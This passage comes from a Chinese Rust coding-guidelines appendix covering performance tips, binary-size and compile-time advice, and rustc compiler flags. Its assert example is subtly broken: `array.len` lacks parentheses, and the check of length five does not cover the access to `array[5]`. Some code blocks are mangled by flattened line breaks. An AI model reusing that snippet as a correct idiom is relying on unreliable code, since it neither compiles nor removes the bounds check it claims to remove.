<p><img src="safe-guides/Appendix/optimizing/./image/perf/8.png" alt="8" /></p>
<p>所以我们可以手工插入一次断言检查，就可以消除编译器的自动插入。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn do_something_with_array(array: &amp;[u8]) -&gt; u8 {    assert!(array.len &gt;= 5);    array[0] + array[1] + array[2] + array[3] + array[4] + array[5]}
<span class="boring">}
</span></code></pre></pre>
<p>这一条也是可以举一反三的，比如 Rust 也会为普通的加法操作添加防止计算溢出的断言，但是你如何手工使用了 wrapped_add 之类的方法，那就可以避免编译器自动插入这类断言。</p>
<h3 id="7-使用链接时优化lto"><a class="header" href="#7-使用链接时优化lto">7. 使用链接时优化（LTO）</a></h3>
<p>链接时优化允许编译器跨 crate 进行内联，但是这样做的代价是减慢编译时间。但我认为，编译时间如何能换取性能提升，那么这个时间值得牺牲。</p>
<h3 id="8-不要使用-inlinealways"><a class="header" href="#8-不要使用-inlinealways">8. 不要使用 <code>#[inline(always)]</code></a></h3>
<p>Rust 编译器自身的优化可以计算出何时需要内联一些函数，不需要你手工明确指定。除非这个函数调用十分频繁。</p>
<p>因为这种显式的指定会导致编译大小的膨胀，如果你的硬件资源不受限可能不太重要。但是对于资源受限的环境，比如嵌入式，则需要进行权衡。</p>
<p>对于一些小的函数，如果没有使用 LTO，但是需要跨 crate 内联的话，也可以显式指定 <code>#[inline]</code>。</p>
<h3 id="9-避免显式-clone"><a class="header" href="#9-避免显式-clone">9. 避免显式 Clone</a></h3>
<p>尽可能地使用引用，避免过多的 Clone 。因为Clone 可能伴随内存分配。</p>
<h3 id="10-使用-unsafe-方法消除一些不必要的安全检查"><a class="header" href="#10-使用-unsafe-方法消除一些不必要的安全检查">10. 使用 Unsafe 方法消除一些不必要的安全检查</a></h3>
<p>在 Rust 标准库中，你可以看到很多 <code>_unchecked</code>后缀的方法。</p>
<p>比如 <code>String::from_utf8</code> 和 <code>String::from_utf8_unchecked</code>，是一对 Safe 和 Unsafe 的方法。</p>
<p>一般情况下，应该使用 <code>String::from_utf8</code>  将 <code>u8</code>序列转换为合法的字符串，这个方法对 <code>u8</code>序列进行了合法 utf8编码的检查。但是这个检查也会有一定开销。</p>
<p>如果开发者能确保调用环境的 <code>u8</code>序列来源是完全合法的 utf8 编码，那么这个安全检查就完全可以忽略。此时就可以使用  <code>String::from_utf8_unchecked</code> 来替换  <code>String::from_utf8</code> 用来提升性能。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn from_utf8(vec: Vec&lt;u8&gt;) -&gt; Result&lt;String, FromUtf8Error&gt; {    match str::from_utf8(&amp;vec) {        Ok(..) =&gt; Ok(String { vec }),        Err(e) =&gt; Err(FromUtf8Error { bytes: vec, error: e }),    }}pub unsafe fn from_utf8_unchecked(bytes: Vec&lt;u8&gt;) -&gt; String {    String { vec: bytes }}
<span class="boring">}
</span></code></pre></pre>
<h3 id="11-并发并行化你的程序"><a class="header" href="#11-并发并行化你的程序">11. 并发/并行化你的程序</a></h3>
<p>用 Rust 写多线程和异步并发程序是非常便利的。</p>
<p>推荐的库有很多：</p>
<ul>
<li><a href="https://github.com/rayon-rs/rayon">rayon</a>，并行迭代器</li>
<li><a href="https://docs.rs/crossbeam/latest/crossbeam/">crossbeam</a> / <a href="https://github.com/zesterer/flume">flume</a>，多线程channel/ 无锁并发结构</li>
<li><a href="https://github.com/tokio-rs/tokio">Tokio</a> ，高性能异步运行时
<ul>
<li><a href="https://github.com/tokio-rs/loom">loom</a>， Tokio 提供的并发代码测试工具，支持 C11 内存模型。</li>
<li><a href="https://github.com/tokio-rs/console">console</a>，Tokio 提供的 Rust 异步诊断和调试工具，可以将其视为异步代码的 Clippy。通过监控应用程序中任务的运行时操作，可以检测<em>可能</em>暗示错误或性能问题的行为模式，并突出显示它们以供用户分析。</li>
</ul>
</li>
<li>跨平台 SIMD，并行化你的计算。</li>
</ul>
<h3 id="12--并发程序中合理使用锁或替换无锁数据结构"><a class="header" href="#12--并发程序中合理使用锁或替换无锁数据结构">12.  并发程序中，合理使用锁，或替换无锁数据结构</a></h3>
<p>在某些场景中，可能读并发访问要比写并发更频繁，那么可以用 读写锁来替换互斥锁。另外，使用第三方库 parking_lot 中定义的并发锁来代替标准库中的锁。</p>
<p>或者合理选择无锁数据结构来替换用锁来同步的数据结构，并不是说无锁一定比锁同步性能更好，也是需要看场景和选择高质量的第三方实现。</p>
<h3 id="13-使用-clippy"><a class="header" href="#13-使用-clippy">13. 使用 Clippy</a></h3>
<p>使用 Clippy 工具对代码进行静态分析，它可以针对性能改进提供一些建议。</p>
<p>关于 Clippy 性能改进 lint 可以在这里找到：<a href="https://rust-lang.github.io/rust-clippy/master/index.html">https://rust-lang.github.io/rust-clippy/master/index.html</a></p>
<p>同样可以遵循 <a href="https://rust-coding-guidelines.github.io/rust-coding-guidelines-zh/"> Rust 编码规范 </a> 中的一些规范，也会包括 Clippy 的一些建议。如果你有什么性能优化的小技巧，欢迎提交贡献。</p>
<h2 id="编译大小和编译时间的优化总结"><a class="header" href="#编译大小和编译时间的优化总结">编译大小和编译时间的优化总结</a></h2>
<h3 id="1-优化编译大小"><a class="header" href="#1-优化编译大小">1. 优化编译大小</a></h3>
<ul>
<li>设置 codegen-units=1 ，codegen-units 叫做代码生成单元，Rust 编译器会把crate 生成的 LLVMIR进行分割，默认分割为16个单元，每个单元就叫 codegen-units，如果分割的太多，就不利于 Rust编译器使用内联优化一些函数调用，分割单元越大，才越容易判断需要内联的地方。但是这也有可能增大编译文件大小，需要大小和性能间寻找平衡。</li>
<li>设置panic=abort。可以缩减编译文件的大小。</li>
<li>设置编译优化等级为 <code>z</code>，意为最小二进制体积。编译器的优化级别对应的是<code>LLVM</code>函数内联的阈值，<code>z</code> 对应的是 25，而 级别 <code>3</code>则对应 275 。</li>
<li>评估代码中泛型和宏的使用，是否可以精简</li>
<li>其他参考：https://github.com/johnthagen/min-sized-rust</li>
</ul>
<h3 id="2-优化编译大小的一些技巧"><a class="header" href="#2-优化编译大小的一些技巧">2. 优化编译大小的一些技巧</a></h3>
<ul>
<li>
<p>使用 cargo check 代替 cargo build</p>
</li>
<li>
<p>使用最新 Rust 工具链</p>
</li>
<li>
<p>使用 Rust Analyzer 而不是 Rust Language Server (RLS)</p>
</li>
<li>
<p>删除未使用的依赖项</p>
</li>
<li>
<p>替换依赖过多的第三方库</p>
</li>
<li>
<p>使用 workspace，将项目拆分为多个crate，方便并行编译</p>
</li>
<li>
<p>将针对模块的测试单独拆分为一个测试文件</p>
</li>
<li>
<p>将所有集成测试组合在一个文件中</p>
</li>
<li>
<p>禁止 crate 依赖未使用功能</p>
</li>
<li>
<p>使用 ssd或Ramdisk（虚拟内存盘） 进行编译</p>
</li>
<li>
<p>使用 <a href="https://github.com/mozilla/sccache">sccache</a> 缓存依赖项</p>
</li>
<li>
<p>切换到更快的链接器：<a href="https://github.com/rui314/mold">mold</a> （Linux）/ <a href="https://github.com/michaeleisel/zld">zld</a> (MacOS) /  🤷 (Windows)，可以使用以下命令检查链接所花时间：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>cargo cleancargo +nightly rustc --bin &lt;your_binary_name&gt; -- -Z time-passes
<span class="boring">}
</span></code></pre></pre>
</li>
<li>
<p>Rust 针对 MacOS 用户也提升了增量编译性能，在 Cargo.toml 中进行以下配置：</p>
</li>
<li>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>[profile.dev]split-debuginfo = &quot;unpacked&quot;
<span class="boring">}
</span></code></pre></pre>
</li>
<li>
<p>调整更多 Codegen 选项/编译器标志。这是<a href="https://doc.rust-lang.org/rustc/codegen-options">完整的 codegen 选项列表</a> 。为了获得灵感，这里是<a href="https://github.com/bevyengine/bevy/blob/3a2a68852c0a1298c0678a47adc59adebe259a6f/.cargo/config_fast_builds">bevy 的用于更快编译的配置</a>。</p>
</li>
<li>
<p>剖析文件编译时间。使用 <a href="https://blog.rust-lang.org/inside-rust/2020/02/25/intro-rustc-self-profile.html#profiling-the-compiler"><code>cargo rustc -- -Zself-profile</code></a>生成的跟踪文件可以使用火焰图或 Chromium 分析器进行可视化。还有一个<a href="https://doc.rust-lang.org/nightly/cargo/reference/unstable.html#timings"><code>cargo -Z timings</code></a>功能可以提供有关每个编译步骤需要多长时间的一些信息，并随着时间的推移跟踪并发信息。</p>
</li>
<li>
<p>避免过程宏 Crates，主要是因为使用了 syn 。过程宏是 Rust 开发的热点：它们会消耗 CPU 周期，因此请谨慎使用。serde 库中包含了过程宏，它在很多地方都用到，所以需要注意是否一定需要serde 进行序列化和反序列化。</p>
</li>
<li>
<p>避免过多的泛型。过多的泛型单态化也会导致编译时间增加。</p>
</li>
<li>
<p>提升你的硬件，或者在云端（比如<a href="https://gitpod.io/">Gitpod.io</a>，可免费使用 16 核 Intel Xeon 2.80GHz，60GB RAM的主机）使用更好的硬件环境进行编译。</p>
</li>
<li>
<p>下载所有的依赖 crate。编译过程中有很大一部分时间用于下载，提前下载好crate是有帮助的。参考 https://github.com/the-lean-crate/criner</p>
</li>
<li>
<p>使用 docker 进行编译。<a href="https://www.lpalmieri.com/posts/fast-rust-docker-builds/"><code>cargo-chef</code></a>可用于充分利用 Docker 层缓存，从而大大加快 Rust 项目的 Docker 构建。</p>
</li>
<li>
<p>超频 cpu ？谨慎。</p>
</li>
<li>
<p>优化 CI 构建速度。参考 https://matklad.github.io/2021/09/04/fast-rust-builds.html。</p>
</li>
<li>
<p>你自己开发 crate 的时候尽量保持精简，利人利己。</p>
</li>
</ul>
<h2 id="参考-2"><a class="header" href="#参考-2">参考</a></h2>
<ol>
<li>
<p><a href="https://zenoh.io/blog/2021-07-13-zenoh-performance-async/">https://zenoh.io/blog/2021-07-13-zenoh-performance-async/</a></p>
</li>
<li>
<p><a href="https://bheisler.github.io/criterion.rs/book/getting_started.html">https://bheisler.github.io/criterion.rs/book/getting_started.html</a></p>
</li>
<li>
<p><a href="https://rust-coding-guidelines.github.io/rust-coding-guidelines-zh/safe-guides/Appendix/test/benchmark.html#%E7%94%A8-cargo-bench-%E5%92%8C-criterionrs-%E6%9D%A5%E6%89%A7%E8%A1%8C%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95">https://rust-coding-guidelines.github.io/rust-coding-guidelines-zh/safe-guides/Appendix/test/benchmark.html#%E7%94%A8-cargo-bench-%E5%92%8C-criterionrs-%E6%9D%A5%E6%89%A7%E8%A1%8C%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95</a></p>
</li>
<li>
<p><a href="https://gist.github.com/jFransham/369a86eff00e5f280ed25121454acec1">https://gist.github.com/jFransham/369a86eff00e5f280ed25121454acec1</a></p>
</li>
<li>
<p><a href="https://github.com/tag1consulting/goose">https://github.com/tag1consulting/goose</a></p>
</li>
<li>
<p><a href="https://rustmagazine.github.io/rust_magazine_2021/chapter_11/rust-profiling.html?search=">https://rustmagazine.github.io/rust_magazine_2021/chapter_11/rust-profiling.html?search=</a></p>
</li>
<li>
<p><a href="https://rustmagazine.github.io/rust_magazine_2021/chapter_7/paper-rust-vs-c.html">https://rustmagazine.github.io/rust_magazine_2021/chapter_7/paper-rust-vs-c.html</a></p>
</li>
<li>
<p><a href="https://blues-star.github.io/perf-book-zh/benchmarking_zh.html">https://blues-star.github.io/perf-book-zh/benchmarking_zh.html</a></p>
</li>
<li>
<p><a href="https://en.pingcap.com/blog/how-we-trace-a-kv-database-with-less-than-5-percent-performance-impact/">https://en.pingcap.com/blog/how-we-trace-a-kv-database-with-less-than-5-percent-performance-impact/</a></p>
</li>
<li>
<p><a href="https://rust-coding-guidelines.github.io/rust-coding-guidelines-zh/">https://rust-coding-guidelines.github.io/rust-coding-guidelines-zh/</a></p>
</li>
<li>
<p><a href="https://endler.dev/2020/rust-compile-times/">https://endler.dev/2020/rust-compile-times/</a></p>
</li>
<li>
<p><a href="https://github.com/johnthagen/min-sized-rust">https://github.com/johnthagen/min-sized-rust</a></p>
</li>
<li>
<p><a href="https://docs.rust-embedded.org/book/unsorted/speed-vs-size.html">https://docs.rust-embedded.org/book/unsorted/speed-vs-size.html</a></p>
</li>
<li>
<p><a href="https://fasterthanli.me/articles/why-is-my-rust-build-so-slow">https://fasterthanli.me/articles/why-is-my-rust-build-so-slow</a></p>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hrust编译器编译参数说明"><a class="header" href="#hrust编译器编译参数说明">H.Rust编译器编译参数说明</a></h1>
<h2 id="rustc-说明"><a class="header" href="#rustc-说明">Rustc 说明</a></h2>
<p>通过以下命令可以打印编译器相关参数选项：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>
<span class="boring">fn main() {
</span>$ rustc -h 
// 或
$ rustc --help
// 在 Nightly Rust 下，比 Stable Rust 多一个 `-Z` 参数，用于传递 unstable compiler options
<span class="boring">}
</span></code></pre></pre>
<h2 id="参数功能"><a class="header" href="#参数功能">参数功能</a></h2>
<h3 id="-h----help"><a class="header" href="#-h----help"><code>-h</code> / <code>--help</code></a></h3>
<p>用于打印 <code>rustc</code> 的帮助信息</p>
<h3 id="--cfg"><a class="header" href="#--cfg"><code>--cfg</code></a></h3>
<p>用于打开或关闭 <code>#[cfg]</code> 变量中的各种条件编译设置。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>--cfg 'verbose'  // 对应 #[cfg(verbose)]
// or
--cfg 'feature=&quot;serde&quot;' // 对应 #[cfg(feature = &quot;serde&quot;)]
<span class="boring">}
</span></code></pre></pre>
<h3 id="-l"><a class="header" href="#-l"><code>-L</code></a></h3>
<p><code>-L</code> 用于将一个目录添加到外部搜索路径。命令格式如下：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>-L [KIND=]PATH
<span class="boring">}
</span></code></pre></pre>
<p>当 <code>KIND</code> 是以下情况之一时，可以使用 <code>-L KIND=PATH </code>这种形式指定搜索路径的类型：</p>
<ul>
<li><code>dependency</code> — 仅在该目录中搜索传递依赖项。</li>
<li><code>crate</code> — 仅在该目录中搜索此 crate 的直接依赖项。</li>
<li><code>native</code> — 仅在该目录中搜索本地库。</li>
<li><code>framework</code> — 仅用于在该目录中搜索 macOS 框架。</li>
<li><code>all</code> — 搜索此目录中的所有库类型。如果 KIND 没有指定，这将是默认值.</li>
</ul>
<h3 id="-l-1"><a class="header" href="#-l-1"><code>-l</code></a></h3>
<p>用于将生成的 crate 链接到本地库。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>-l [KIND[:MODIFIERS]=]NAME[:RENAME]
<span class="boring">}
</span></code></pre></pre>
<p>当 <code>KIND</code> 是以下情况之一时，库的种类可以使用 <code>-l KIND=lib</code> 这种形式指定:</p>
<ul>
<li><code>dylib</code> — 本地动态库</li>
<li><code>static</code> — 本地静态库 (例如 .a archive 文件)</li>
<li><code>framework</code> — macOS 框架</li>
</ul>
<p>可以用<code>#[link]</code>属性指定库的种类。 如果未在 <code>link </code>属性或命令行中指定 <code>KIND</code> ，它将链接到可用动态库，否则将使用静态库。 如果在命令行中指定了库类型，其将会覆盖 <code>link</code> 属性指定的库类型。</p>
<p><code>link</code> 属性中使用的名称可以使用形如<code> -l ATTR_NAME:LINK_NAME</code> 形式覆盖，其中 <code>ATTR_NAME</code> 是 <code>link</code> 属性中的名称，<code>LINK_NAME </code>是将要链接到的实际库的名称。</p>
<h4 id="--crate-type"><a class="header" href="#--crate-type"><code>--crate-type</code></a></h4>
<p>这将指示 rustc 以何种 crate type 去构建。该 Flag 接收逗号分隔的值列表，也可以多次指定。有效的 crate type 如下：</p>
<ul>
<li><code>lib</code> — 编译器生成的首选库类型， 目前默认为 rlib。</li>
<li><code>rlib</code> — Rust 静态库。</li>
<li><code>staticlib</code> — 本地静态库。</li>
<li><code>dylib</code> — Rust 动态库。</li>
<li><code>cdylib</code> — 本地动态库。</li>
<li><code>bin</code> — 可执行程序。</li>
<li><code>proc-macro</code> — 生成格式化且编译器可加载的过程宏库。</li>
</ul>
<p>可以使用 <code>crate_type</code>属性来指定 crate 类型，注意  <code>--crate-type</code> 命令行的值会覆盖 crate_type 属性的值。更多细节可以参阅 reference 中的<a href="https://doc.rust-lang.org/stable/reference/linkage.html"> 链接章节</a>。</p>
<h4 id="--crate-name"><a class="header" href="#--crate-name"><code>--crate-name</code></a></h4>
<p>用于指定正在构建的 crate 名称</p>
<h4 id="--edition"><a class="header" href="#--edition"><code>--edition</code></a></h4>
<p>用于指定编译器使用哪个 版次（edition），可选项 <code>2015|2018|2021</code>。</p>
<h4 id="--emit"><a class="header" href="#--emit"><code>--emit</code></a></h4>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span> --emit [asm|llvm-bc|llvm-ir|obj|metadata|link|dep-info|mir]
<span class="boring">}
</span></code></pre></pre>
<p>该 Flag 控制编译器生成的输出文件的类型。其接收以逗号分隔的值列表，也可以多次指定。有效的生成类型有：</p>
<ul>
<li><code>asm</code> — 生成在 crate 中的一个汇编代码文件。 默认的输出文件是 CRATE_NAME.s。</li>
<li><code>dep-info</code> — 生成一个包含 Makefile 语法的文件，指示加载以生成 crate 的所有源文件。 默认输出文件是 CRATE_NAME.d。</li>
<li><code>link</code> — 生成由 --crate-type 指定的 crates 。 默认输出文件取决于平台和 crate 类型。 如果未指定 --emit 这将是默认值。</li>
<li><code>llvm-bc</code> — 生成一个包含 LLVM bitcode 的二进制文件。默认输出文件是 CRATE_NAME.bc。</li>
<li><code>llvm-ir</code> — 生成一个包含 LLVM IR（ LLVM 中间语言）的文件。默认的输出文件是 CRATE_NAME.ll。</li>
<li><code>metadata</code> — 生成一个关于该 crate 的元数据的文件。 默认输出文件是 CRATE_NAME.rmeta。</li>
<li><code>mir</code> — 生成一个包含 Rust 中级中间表示（即中级中间语言）的文件。默认输出文件名是 <code>CRATE_NAME.mir</code>。</li>
<li><code>obj</code> — 生成一个本地对象文件，默认输出文件是 <code>CRATE_NAME.o</code>。</li>
</ul>
<p>输出文件名可以用 <code>-o flag</code> 进行设置。使用<code> -C extra-filename</code>。Flag 可以添加文件名后缀。文件将被写入当前目录除非使用<code>--out-dir flag</code> 标签。 每一个生成类型也可以使用 <code>KIND=PATH </code>的形式指定输出文件名，它优先于 <code>-o </code>标签。</p>
<h3 id="--print"><a class="header" href="#--print"><code>--print</code></a></h3>
<p>用于打印有关编译器的各种信息。指定<code>--print</code>标签通常会禁用 <code>--emit </code>步骤且只打印请求的信息。打印的有效值类型为：</p>
<ul>
<li><code>crate-name</code> — crate 的名称。</li>
<li><code>file-names</code> — 文件名由 link 命令执行的种类所决定。</li>
<li><code>sysroot</code> — 系统根目录路径，即<code>.rustup</code> 下的 <code>toolchains</code> 文件夹。</li>
<li><code>target-libdir</code> - 目标<code>lib</code>文件夹路径（同上）。</li>
<li><code>cfg</code> — 条件编译值列表。 了解更多条件编译值信息，请参阅 条件编译。</li>
<li><code>target-list</code> — 已知目标列表。 可以使用<code>--target </code>标签选择目标。</li>
<li><code>target-cpus </code>— 当前目标的可用 CPU 值列表。可以使用 <code>-C target-cpu=val</code>  Flag 选择目标。</li>
<li><code>target-features</code>— 当前目标的可用 目标 <code>features</code> 列表。目标 <code>features</code> 可以使用<code>-C target-feature=val</code>flag 启用。该Flag是不安全（ unsafe ）的。</li>
<li><code>relocation-models</code> — 重定位模型列表。重定位模型可以用 <code>-C relocation-model=val </code> Flag 选择。</li>
<li><code>code-models</code> — 代码模型列表。代码模型可以用<code> -C code-model=val</code> flag 进行设置。</li>
<li><code>tls-models</code> — 支持的线程本地存储模型列表。 模型可以用<code>-Z tls-model=val</code> Flag 来选择（仅限 Nightly Rust）。</li>
<li><code>native-static-libs</code> — 当创建一个<code> staticlib crate</code> 类型时可以使用此选项。 如果这是唯一的标志，它将执行一个完整的编译，并包含一个指出链接生成静态库时要使用的链接器 Flag 的诊断说明。该说明以文本 <code>native-static-libs:</code> 开始，以便更容易获取输出信息。</li>
</ul>
<h3 id="-g"><a class="header" href="#-g"><code>-g</code></a></h3>
<p>等价于 <code>-C debuginfo=2</code>，用于输出调试信息。</p>
<p><strong>调试信息说明：</strong></p>
<ul>
<li><code>0</code>：根本没有调试信息（默认）。</li>
<li><code>1</code>: 仅行表。</li>
<li><code>2</code>：完整的调试信息。</li>
</ul>
<h3 id="-o-大写的字母o优化"><a class="header" href="#-o-大写的字母o优化"><code>-O</code> （大写的字母o，优化）</a></h3>
<p>等价于 <code>-C opt-level=2</code>，用于编译优化，level为2。</p>
<p><strong>优化级别说明：</strong></p>
<ul>
<li><code>0</code>：没有优化，也打开 <a href="https://doc.rust-lang.org/rustc/codegen-options/index.html#debug-assertions"><code>cfg(debug_assertions)</code></a>（默认）。</li>
<li><code>1</code>: 基本优化。</li>
<li><code>2</code>: 一些优化。</li>
<li><code>3</code>: 所有优化。</li>
<li><code>s</code>:  优化二进制大小。</li>
<li><code>z</code>：优化二进制大小，但也关闭循环向量化。 </li>
</ul>
<p>默认值为<code>0</code>.</p>
<h3 id="-o"><a class="header" href="#-o"><code>-o</code></a></h3>
<p>用于控制输出的文件名。</p>
<h4 id="--out-dir-dir"><a class="header" href="#--out-dir-dir"><code>--out-dir DIR</code></a></h4>
<p>用于指定输出目录位置。</p>
<h4 id="--explain-opt"><a class="header" href="#--explain-opt"><code>--explain OPT</code></a></h4>
<p>用于提供错误消息的详细说明。<code>rustc</code> 对于每一个（检测到的）错误都会返回一个错误码，这将打印给定错误的更详细说明。</p>
<h4 id="--test"><a class="header" href="#--test"><code>--test</code></a></h4>
<p>构建测试工具。</p>
<h4 id="--target-target"><a class="header" href="#--target-target"><code>--target TARGET</code></a></h4>
<p>指定编译的<code> target triple</code> 。</p>
<h3 id="设置-lint"><a class="header" href="#设置-lint">设置 lint</a></h3>
<h4 id="-w"><a class="header" href="#-w"><code>-W</code></a></h4>
<p>等价于 <code>--warn LINT</code> ，设置给定 lint 为 warning 级别。</p>
<h4 id="-a"><a class="header" href="#-a"><code>-A</code></a></h4>
<p>等价于 <code>--allow LINT</code> ，设置给定 lint 为 allow 级别。</p>
<h4 id="-d"><a class="header" href="#-d"><code>-D</code></a></h4>
<p>等价于 <code>--deny LINT</code> ，设置给定 lint 为 deny 级别。</p>
<h4 id="-f"><a class="header" href="#-f"><code>-F</code></a></h4>
<p>等价于 <code>--forbid LINT</code> ，设置给定 lint 为 forbid 级别。</p>
<h3 id="-c"><a class="header" href="#-c"><code>-C</code></a></h3>
<p>用于设置 <a href="https://doc.rust-lang.org/rustc/codegen-options/index.html">代码生成</a> 选项。可以通过 <code>rustc -C help</code> 进一步查看其选项。</p>
<h4 id="已弃用参数"><a class="header" href="#已弃用参数">已弃用参数</a></h4>
<ul>
<li><code>ar=val</code>，废弃。</li>
<li><code>no-stack-check=val</code>，废弃。</li>
</ul>
<h4 id="code-model-优化相关"><a class="header" href="#code-model-优化相关"><code>code-model</code> （优化相关）</a></h4>
<p><code>code-model=val</code>，支持的值为：</p>
<ul>
<li><code>tiny</code> - 微小的代码模型。</li>
<li><code>small</code>- 小代码模型。这是大多数受支持目标的默认模型。</li>
<li><code>kernel</code> - 内核代码模型。</li>
<li><code>medium</code> - 中等代码模型。</li>
<li><code>large</code> - 大型代码模型。比如 x86 平台上，告诉编译器不要进行任何假设，使用64位绝对取址模型访问代码及数据。</li>
</ul>
<p>可以通过命令 <code>rustc --print code-models</code> 查看。</p>
<p>代码模型对程序及其符号可能使用的地址范围施加了限制。对于较小的地址范围，机器指令可能能够使用更紧凑的寻址模式。具体范围取决于目标架构和可用的寻址模式。</p>
<p>代码模型是程序员与编译器间的一个正式的协议，其中程序员表达其对最终程序将进入的当前正在编译的目标文件大小的意愿。比如，“不要担心，这个对象只会进入不那么大的程序，因此你可以使用快速的RIP相对取址模式”，相反，“这个对象期望链接进巨大的程序，因此请使用慢但安全的，带有完整64位偏移的绝对取址模式”。</p>
<h4 id="codegen-units-优化-性能-vs-编译速度"><a class="header" href="#codegen-units-优化-性能-vs-编译速度"><code>codegen-units</code> （优化： 性能 vs 编译速度）</a></h4>
<p><code>codegen-units=val</code>，这个值表示控制 crate 分成多少个代码生成单元（codegen units），它需要一个大于 0 的整数。</p>
<p>当一个 crate 被拆分为多个代码生成单元时，LLVM 能够并行处理它们。增加并行度可能会<strong>加快编译时间</strong>，但也可能会<strong>产生更慢的代码</strong>，因为可能会影响内联（inline）优化。</p>
<p>将此设置为 <code>1</code> 可能会提高生成代码的性能，但编译速度可能会变慢。</p>
<p>如果未指定，则默认值为 16，用于非增量构建。对于增量构建，默认值为 256，这允许缓存更细粒度。</p>
<h4 id="control-flow-guard-安全"><a class="header" href="#control-flow-guard-安全"><code>control-flow-guard</code> （安全）</a></h4>
<p>此Flag 控制 LLVM 是否启用 Windows <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">控制流保护（Control Flow Guard）</a> 平台安全功能。对于非 Windows 目标，此标志当前被忽略。它采用以下值之一：</p>
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, <code>checks</code>, 或无值：表示启用控制流防护。</li>
<li><code>nochecks</code>：在没有运行时强制检查的情况下发出控制流保护元数据（这应该只用于测试目的，因为它不提供安全强制）。</li>
<li><code>n</code>, <code>no</code>, <code>off</code>: 不启用控制流保护（默认）。</li>
</ul>
<p>关于 Rust 和 CFG 的更详细说明参考：</p>
<ul>
<li><a href="https://msrc-blog.microsoft.com/2020/08/17/control-flow-guard-for-clang-llvm-and-rust/">Control Flow Guard for Clang/LLVM and Rust</a> </li>
<li><a href="https://doc.rust-lang.org/beta/unstable-book/compiler-flags/control-flow-guard.html">UnStable book: control-flow-guard</a></li>
</ul>
<h4 id="debug-assertions"><a class="header" href="#debug-assertions"><code>debug-assertions</code></a></h4>
<p><code>debug-assertions=val</code>，用于打开或关闭 <code>cfg(debug_assertions)</code> 条件编译。采用以下的值：</p>
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, 或无值：启用调试断言。</li>
<li><code>n</code>, <code>no</code>, or <code>off</code>: 禁用调试断言。</li>
</ul>
<p>如果无指定，调试断言会在 <a href="https://doc.rust-lang.org/rustc/codegen-options/index.html#opt-level">opt-level</a> 为 0 的优化级别下默认开启。所以这里需要注意优化级别，debug_assertions 在 release 编译时最好不要开启。这个和 <code>debug_assert!</code> 宏相关。</p>
<h4 id="default-linker-libraries"><a class="header" href="#default-linker-libraries"><code>default-linker-libraries</code></a></h4>
<p><code>default-linker-libraries=val</code>，用于设置链接器是否可以链接它的默认库，可以设置的值为：</p>
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, 或无值：包括默认库（默认）。</li>
<li><code>n</code>, <code>no</code>, or <code>off</code>: 排除默认库。</li>
</ul>
<h4 id="embed-bitcode-优化编译大小--编译时间"><a class="header" href="#embed-bitcode-优化编译大小--编译时间"><code>embed-bitcode</code> （优化：编译大小 &amp;&amp; 编译时间）</a></h4>
<p><code>embed-bitcode=val</code>，控制编译器是否将 LLVM 位码嵌入到目标文件中。它采用以下值之一：</p>
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, 或无值：将位码放入 rlibs（默认）。</li>
<li><code>n</code>, <code>no</code>, or <code>off</code>: 从 rlibs 中省略位码。</li>
</ul>
<p><code>rustc</code> 执行链接时优化 (LTO) 时需要 LLVM 位码（bitcode）。嵌入的位码将出现在 rustc 生成的目标文件中，该文件的名称由目标平台定义。大多数时候是这样 <code>.llvmbc</code>。</p>
<p>如果你的编译实际不需要位码，使用<code>-C embed-bitcode=no</code> 可以显著提高编译时间并减少生成的文件大小（例如，如果你不为iOS编译或者你不执行LTO）。由于这些原因，Cargo尽可能地使用<code>-C embed-bitcode=no</code>。同样地，如果你直接用 rustc 构建，我们建议在不使用 LTO 时使用 <code>-C embed-bitcode=no</code>。</p>
<p>如果与<code>-C lto</code>结合，<code>-C embed-bitcode=no</code>将导致<code>rustc</code>在启动时中止，因为这种结合是无效的。</p>
<blockquote>
<p>bitcode是由LLVM引入的一种中间代码(Intermediate Representation，简称IR)，它是源代码被编译为二进制机器码过程中的中间表示形态，它既不是源代码，也不是机器码。从代码组织结构上看它比较接近机器码，但是在函数和指令层面使用了很多高级语言的特性。LLVM 优化器负责对bitcode进行各种类型的优化，将bitcode代码进行一些逻辑等价的转换，使得代码的执行效率更高，体积更小，比如DeadStrip/SimplifyCFG，LLVM 后端负责把优化后的bitcode编译为指定目标架构的机器码。</p>
<p>来源：<a href="https://xelz.info/blog/2018/11/24/all-you-need-to-know-about-bitcode/">https://xelz.info/blog/2018/11/24/all-you-need-to-know-about-bitcode/</a></p>
</blockquote>
<h4 id="force-frame-pointers-优化性能"><a class="header" href="#force-frame-pointers-优化性能"><code>force-frame-pointers</code> （优化：性能）</a></h4>
<p><code>force-frame-pointers=val</code>，用于设置是否强制启用 帧指针（frame-pointers）。相当于 Clang 的<code>-fno-omit-frame-pointer</code>，</p>
<p>它采用以下值之一：</p>
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, 或无值：强制启用帧指针。</li>
<li><code>n</code>, <code>no</code>, or <code>off</code>: 不要强制启用帧指针。这并不一定意味着将删除帧指针。</li>
</ul>
<p>如果未强制启用帧指针，则默认行为取决于 target。</p>
